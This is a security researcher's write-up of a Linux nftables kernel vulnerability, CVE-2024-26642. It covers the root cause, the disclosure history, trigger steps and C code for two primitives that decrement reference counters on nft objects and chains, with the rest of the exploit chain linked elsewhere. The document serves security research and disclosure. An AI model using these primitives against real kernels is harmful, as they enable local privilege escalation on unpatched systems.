# Exploit detail about CVE-2024-26642
If you want to get some base information about CVE-2023-6817, please read [vulnerability.md](./vulnerability.md) first.

## Background
nftables is a netfilter project that aims to replace the existing {ip,ip6,arp,eb}tables framework, providing a new packet filtering framework for {ip,ip6}tables, a new userspace utility (nft) and A compatibility layer. It uses existing hooks, link tracking system, user space queuing component and netfilter logging subsystem.

It consists of three main components: kernel implementation, libnl netlink communication and nftables user space front-end. The kernel provides a netlink configuration interface and runtime rule set evaluation. libnl contains basic functions for communicating with the kernel. The nftables front end is for user interaction through nft.

nftables implements data packet filtering by using some components like `table`, `set`, `chain`, `rule`.

## Some additional stories
After reading `vulnerability.md` or `cause analysis`, you may wonder why the root cause and patch do not seem to match. I can only talk about the vulnerability reporting process for this question.
I sent a vulnerability report to security@kernel.org at 2024.2.29 13:33: 
``` 
Hi, I've found a new vulnerability in Linux netfilter/nftable subsystem. In the function nf_tables_deactivate_set, it does not set "set->dead = 1". This makes it possible to call nft_setelem_data_deactivate with a set element more than once by following this step: 
1. Create a pipapo set with flag NFT_SET_TIMEOUT and NFT_SET_ANONYMOUS. 
2. Create a set element of this pipapo set with flag NFTA_SET_ELEM_EXPIRATION. 
3. Create a chain. 
4. Create a rule with nft_lookup expr, which will bind the pipapo set we create in step 1. 
5. Delete the chain And finally nft_setelem_data_deactivate will be called for the same set element both in nft_map_deactivate and in function pipapo_gc.

Attachment is the poc I wrote for this vulnerability, which leaks some kernel pointers. I tested it on linux 6.1.78.

Thanks,

```
The email also attached a poc I wrote based on the trigger idea (it can cause the latest kernel at that time to produce crahs). I did not receive any reply emails afterwards.
On 2024.3.5, I noticed that the maintainer of netfilter pushed a patch to netfilter (https://patchwork.ozlabs.org/project/netfilter-devel/patch/20240301022605.146412-1-pablo@netfilter.org/). He pushed the corresponding patch without asking for any opinion from me.

The patch did make my poc not work, but this patch did not fix the core of the problem `set->dead = 1`. Therefore, I added two patch commits to `vulnerability.md`.

## Cause anaylysis

In the function nf_tables_deactivate_set, it does not set "set->dead = 1". This makes it possible to call nft_setelem_data_deactivate with a set element more than once by following this step:

1. Create a pipapo set with flag NFT_SET_TIMEOUT and NFT_SET_ANONYMOUS.
2. Create a set element of this pipapo set with flag NFTA_SET_ELEM_EXPIRATION.
3. Create a chain.
4. Create a rule with nft_lookup expr, which will bind the pipapo set we create in step 1.
5. Delete the chain

After you send these commands in a message list, when you reach step 5 `delete the chain`, the following call chain will occur:
```
nf_tables_delchain -> nft_delrule -> nft_rule_expr_deactivate -> (expr->ops->deactivate) -> nft_lookup_deactivate -> nf_tables_deactivate_set -> case NFT_TRANS_PREPARE: nft_map_deactivate
```
`nft_map_deactivate` will eventually call `nft_setelem_data_deactivate` for all set elements in the set.

But at the same time, after all commands are executed, nftable will also call `nf_tables_commit`, which triggers another call chain:

```
nf_tables_commit -> (set->ops->commit) -> nft_pipapo_commit -> pipapo_gc -> nft_pipapo_gc_deactivate -> nft_setelem_data_deactivate
```

Finally, `nft_setelem_data_deactivate` will be called for elements which are timed out in the pipapo set, which may result in multiple calls to `nft_setelem_data_deactivate` for the same set element.

## Triggering the vulnerability

It's easy to trigger it by following this steps:

- Create a pipapo set with flag NFT_SET_TIMEOUT and NFT_SET_ANONYMOUS.
- Create a set element of this pipapo set with flag NFTA_SET_ELEM_EXPIRATION.
- Create a chain.
- Create a rule with nft_lookup expr, which will bind the pipapo set we create in step 1.
- Delete the chain 


## Exploit it
The method of exploiting CVE-2024-26642 is exactly the same as that of exploiting CVE-2023-6817. If you want to learn how I exploit CVE-2023-6817, please read [here](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-6817_lts_cos/docs/exploit.md).The only difference is how to construct the two primitives.

## Primitive
### Primitive_0
I build a function named as `primitive_0` to change the nft_object->use by triggering the vulnerabiltiy:

```c
//make target_obj->use = target_obj->use - repeat_time
void primitive_0(struct nl_sock *socket, char *table, char *target_obj, int repeat_time){
    char *pad = malloc(0x100);
    memset(pad,0x41,0x100);
    int i,j;
    struct nlmsghdr **msg_list = malloc(sizeof(struct nlmsghdr *)*0x100);
    char *key = malloc(0x40);
    char *set_name = "set for primitive0";
    char *chain_name = "chain for primitive0";
    msg_list[0] = new_set_pipapo_for_timeout_with_anonymous_msg(table, set_name, NFT_OBJECT_CT_EXPECT);
    for(i=0;i<repeat_time;i++){
        *(uint64_t *)key = i;
        msg_list[i+1] = new_setelem_with_expiration_msg(table, set_name, pad, 0xc0, target_obj, key, 0x40, NULL, 0, 0,0x0100000000000000);
    }
    msg_list[repeat_time+1] = new_chain_msg(table, chain_name, 0);
    msg_list[repeat_time+2] = new_rule_lookup_for_chain_msg(table, chain_name, set_name, 0);
    msg_list[repeat_time+3] = del_chain_msg(table, chain_name);
    send_msg_list(socket, msg_list, repeat_time+4);

    free(msg_list);
    free(pad);
}
```


How it works:
1. message 0: Create a pipapo set with flags `NFT_SET_TIMEOUT` and `NFT_SET_ANONYMOUS`
2. message from 1 to (repeat_time): Create repeat_time set elements, all of which contain `NFTA_SET_ELEM_EXPIRATION` and `NFTA_SET_ELEM_TIMEOUT`.
3. message repeat_time+1: Create a chain
4. message repeat_time+2: Create a rule on the chain, which contains an expr of type `lookup`. `lookup` expr can be bound to an `nft_set` when initialized, and we let it bind the pipapo set created by message[0].
5. message repeate_time+3: delete the chain created by message repeat_time+1
When the above message is sent, two rounds of calls to `nft_setelem_data_deactivate` for the same set element will be triggered:
    
The first round is when executing message repeate_time+3, and the following call path will be generated in the end:

```c
nf_tables_delchain -> nft_delrule -> nft_rule_expr_deactivate -> (expr->ops->deactivate) -> nft_lookup_deactivate -> nf_tables_deactivate_set -> nft_map_deactivate
```

The `nft_map_deactivate` function will call `nft_mapelem_deactivate` -> `nft_setelem_data_deactivate` for all elements in the pipapo set created by message 0.

The second round is after all messages are executed, `netfilter` will call the `nf_tables_commit` function, and finally generate the calling path:
```c
nft_set_commit_update -> (set->ops->commit) -> nft_pipapo_commit -> pipapo_gc -> nft_pipapo_gc_deactivate -> nft_setelem_data_deactivate
```
The function `pipapo_gc` will also call `nft_setelem_data_deactivate` for all timeout elements in pipapo set.
(This is why it is necessary to add `set->dead = 1` in nf_tables_deactivate_set to fix the vulnerability, because after adding this line of code, the subsequent operations will not be executed in the function nft_set_commit_update.)

It will trigger the vulnerability as described above. In order to achieve the effect of executing "nft_object->use--" multiple times on the same nft_object, I created multiple set elements using the same nft_object at one time.

### Primitive_1
I build a function named as `primitive_1` to change the nft_chain->use by triggering the vulnerabiltiy:

```c
//make target_chain->use = target_chain->use - repeat_time
void primitive_1(struct nl_sock *socket, char *table, char *target_chain, int repeat_time){
    char *pad = malloc(0x100);
    memset(pad,0x41,0x100);
    int i,j;
    struct nlmsghdr **msg_list = malloc(sizeof(struct nlmsghdr *)*0x100);
    char *set_name = "set for primitive1";
    char *chain_name = "chain for primitive1";
    char *key = malloc(0x40);
    msg_list[0] = new_set_pipapo_for_timeout_and_chain_with_anonymous_msg(table, set_name, 0x40);
    for(i=0;i<repeat_time;i++){
        *(uint64_t *)key = i;
        msg_list[i+1] = new_setelem_with_chain_and_expiration_msg(table, set_name, pad, 0xc0, target_chain, key, 0x40, NULL, 0, 0,0x0100000000000000);
    }
    msg_list[repeat_time+1] = new_chain_msg(table, chain_name, 0);
    msg_list[repeat_time+2] = new_rule_lookup_for_chain_msg(table, chain_name, set_name, 1);
    msg_list[repeat_time+3] = del_chain_msg(table, chain_name);
    send_msg_list(socket, msg_list, repeat_time+4);

    free(msg_list);
    free(pad);
}
```
It will trigger the vulnerability as described above. In order to achieve the effect of executing "nft_chain->use--" multiple times on the same nft_object, I created multiple set elements using the same nft_chain at one time.
